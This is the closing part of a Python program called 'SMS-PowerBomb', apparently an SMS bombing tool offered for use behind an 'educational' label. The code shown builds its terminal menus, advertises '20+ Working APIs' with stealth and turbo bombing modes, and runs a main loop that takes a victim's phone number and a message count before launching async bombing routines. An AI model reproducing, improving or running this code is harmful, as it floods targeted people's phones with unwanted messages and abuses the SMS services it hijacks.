║  {c.WHITE}AI Engine Status: {f"{c.NEON_GREEN}ENABLED{c.RESET}" if AI_ENABLED else f"{c.RED}DISABLED{c.RESET}"}                                                {c.NEON_BLUE}║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(menu)

def print_about():
    """Display about information"""
    about = f"""{c.NEON_GREEN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                      ABOUT SMS-POWERBOMB v7.0                             ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {c.WHITE}Tool Name:{c.NEON_ORANGE} SMS-PowerBomb Ultimate AI Domination{c.NEON_GREEN}                       ║
║  {c.WHITE}Version:{c.NEON_ORANGE} 8.0 - AI Domination Edition (5x Faster){c.NEON_GREEN}                     ║
║  {c.WHITE}Creator:{c.NEON_PINK} RAJSARASWATI JATAV{c.NEON_GREEN}                                             ║
║  {c.WHITE}Team:{c.NEON_PINK} RAJSARASWATI JATAV CYBER CREW{c.NEON_GREEN}                                 ║
║  {c.WHITE}Purpose:{c.CYAN} Educational SMS Automation & Security Research{c.NEON_GREEN}                ║
║                                                                           ║
║  {c.BOLD}{c.WHITE}Features:{c.NEON_GREEN}                                                                 ║
║    {c.NEON_ORANGE}►{c.WHITE} 20+ Working APIs with AI Health Monitoring{c.NEON_GREEN}                         ║
║    {c.NEON_ORANGE}►{c.WHITE} 4 Bombing Modes (Normal/Stealth/Turbo/Smart){c.NEON_GREEN}                       ║
║    {c.NEON_ORANGE}►{c.WHITE} Advanced AI Engine with Machine Learning{c.NEON_GREEN}                            ║
║    {c.NEON_ORANGE}►{c.WHITE} Live Dashboard with Real-time Graphs{c.NEON_GREEN}                                ║
║    {c.NEON_ORANGE}►{c.WHITE} Analytics Database with History Tracking{c.NEON_GREEN}                            ║
║    {c.NEON_ORANGE}►{c.WHITE} Adaptive Delay Optimization{c.NEON_GREEN}                                         ║
║    {c.NEON_ORANGE}►{c.WHITE} Smart API Selection by Carrier{c.NEON_GREEN}                                      ║
║    {c.NEON_ORANGE}►{c.WHITE} 5x Faster Performance{c.NEON_GREEN}                                               ║
║    {c.NEON_ORANGE}►{c.WHITE} Export Analytics (JSON/CSV){c.NEON_GREEN}                                         ║
║    {c.NEON_ORANGE}►{c.WHITE} Cross-Platform (Windows/Linux/Termux){c.NEON_GREEN}                              ║
║                                                                           ║
║  {c.BOLD}{c.WHITE}Contact:{c.NEON_GREEN}                                                                  ║
║    {c.CYAN}Telegram: t.me/rajsaraswatijatav{c.NEON_GREEN}                                       ║
║    {c.CYAN}Instagram: @official_rajsaraswati_jatav{c.NEON_GREEN}                                ║
║    {c.CYAN}YouTube: @RajsaraswatiJatav{c.NEON_GREEN}                                            ║
║    {c.CYAN}GitHub: github.com/RAJSARASWATI-JATAV{c.NEON_GREEN}                                  ║
╚═══════════════════════════════════════════════════════════════════════════╝
{c.RESET}"""
    print(about)

def check_api_status(engine: AdvancedBomberEngine):
    """Check and display API status with health metrics"""
    print(f"\n{c.NEON_BLUE}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
    print(f"{c.NEON_BLUE}║{c.BOLD}{c.WHITE}                     API STATUS & HEALTH CHECK                            {c.NEON_BLUE}║{c.RESET}")
    print(f"{c.NEON_BLUE}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
    
    active_count = sum(1 for h in engine.api_health.values() if h['active'])
    print(f"{c.WHITE}Total APIs Configured: {c.NEON_ORANGE}{len(SMS_APIS)}{c.RESET}")
    print(f"{c.WHITE}Active APIs: {c.NEON_GREEN}{active_count}{c.RESET}")
    print(f"{c.WHITE}Inactive APIs: {c.RED}{len(SMS_APIS) - active_count}{c.RESET}\n")
    
    for i, api in enumerate(SMS_APIS, 1):
        health = engine.api_health[api['name']]
        status = f"{c.NEON_GREEN}[ACTIVE]{c.RESET}" if health['active'] else f"{c.RED}[INACTIVE]{c.RESET}"
        
        if health['success'] + health['fail'] > 0:
            success_rate = (health['success'] / (health['success'] + health['fail'])) * 100
            stats = f"{c.DARK}(✓{health['success']} ✗{health['fail']} - {success_rate:.0f}%){c.RESET}"
        else:
            stats = f"{c.DARK}(No data yet){c.RESET}"
        
        print(f"{c.NEON_BLUE}[{i:02d}]{c.WHITE} {api['name']:<20} {status} {stats}")
    
    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} API health monitoring active!{c.RESET}")
    print(f"{c.YELLOW}[!]{c.WHITE} APIs with >90% fail rate are auto-disabled.{c.RESET}\n")

# ═══════════════════════════════════════════════════════════════════
# MAIN PROGRAM
# ═══════════════════════════════════════════════════════════════════

def main_menu():
    """Main menu loop"""
    engine = AdvancedBomberEngine(SMS_APIS)
    
    while True:
        clear_screen()
        print_main_banner()
        print_loading_animation()
        print_creator_info()
        print_main_menu()
        
        print(f"{c.NEON_BLUE}[?]{c.WHITE} Select an option: {c.NEON_ORANGE}", end="")
        choice = input().strip()
        print(c.RESET, end="")
        
        if choice == "1":
            # Start SMS Bombing
            clear_screen()
            print_main_banner()
            print_disclaimer()
            
            print(f"\n{c.YELLOW}[!]{c.WHITE} Do you accept the terms and conditions? (yes/no): {c.NEON_ORANGE}", end="")
            accept = input().strip().lower()
            print(c.RESET, end="")
            
            if accept in ["yes", "y"]:
                print()
                phone = get_phone_input()
                count = get_count_input()
                mode = get_mode_input()
                
                delay = 2
                if mode == '1':  # Normal mode
                    delay = get_delay_input()
                
                print(f"{c.RED}[!]{c.WHITE} Are you sure you want to bomb {c.NEON_ORANGE}{phone}{c.WHITE}? (yes/no): {c.NEON_ORANGE}", end="")
                confirm = input().strip().lower()
                print(c.RESET, end="")
                
                if confirm in ["yes", "y"]:
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Starting bombing sequence...{c.RESET}")
                    time.sleep(1)
                    
                    try:
                        if mode == '1':
                            asyncio.run(normal_mode_bombing(engine, phone, count, delay))
                        elif mode == '2':
                            asyncio.run(stealth_mode_bombing(engine, phone, count))
                        elif mode == '3':
                            asyncio.run(turbo_mode_bombing(engine, phone, count))
                    except KeyboardInterrupt:
                        print(f"\n\n{c.RED}[!]{c.WHITE} Bombing interrupted by user.{c.RESET}")
                    
                    print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to return to main menu...{c.RESET}")
                    input()
                else:
                    print(f"\n{c.YELLOW}[!]{c.WHITE} Operation cancelled by user.{c.RESET}")
                    time.sleep(2)
            else:
                print(f"\n{c.RED}[!]{c.WHITE} You must accept the terms to use this tool.{c.RESET}")
                time.sleep(2)
        
        elif choice == "2":
            # View Disclaimer
            clear_screen()
            print_main_banner()
            print_disclaimer()
            print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "3":
            # About Tool
            clear_screen()
            print_main_banner()
            print_about()
            print(f"\n{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "4":
            # Check API Status
            clear_screen()
            print_main_banner()
            check_api_status(engine)
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Press Enter to continue...{c.RESET}")
            input()
        
        elif choice == "5":
            # Exit
            clear_screen()
            print(f"\n{c.NEON_PINK}╔═══════════════════════════════════════════════════════════════════════════╗{c.RESET}")
            print(f"{c.NEON_PINK}║{c.BOLD}{c.WHITE}                         EXITING SMS-POWERBOMB                             {c.NEON_PINK}║{c.RESET}")
            print(f"{c.NEON_PINK}╚═══════════════════════════════════════════════════════════════════════════╝{c.RESET}\n")
            print(f"{c.NEON_GREEN}[✓]{c.WHITE} Thank you for using SMS-PowerBomb v8.0{c.RESET}")
            print(f"{c.NEON_PINK}[✓]{c.WHITE} Created by: {c.NEON_BLUE}RAJSARASWATI JATAV{c.RESET}")
            print(f"{c.NEON_ORANGE}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
            time.sleep(2)
            sys.exit(0)
        
        else:
            print(f"\n{c.RED}[!]{c.WHITE} Invalid option! Please try again.{c.RESET}")
            time.sleep(2)

# ═══════════════════════════════════════════════════════════════════
# PROGRAM ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}[!]{c.WHITE} Interrupted by user (Ctrl+C).{c.RESET}")
        print(f"{c.NEON_GREEN}[✓]{c.WHITE} Stay dark, stay ethical. Upgrade yourself!{c.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c.RED}[ERROR]{c.WHITE} {str(e)}{c.RESET}\n")
        sys.exit(1)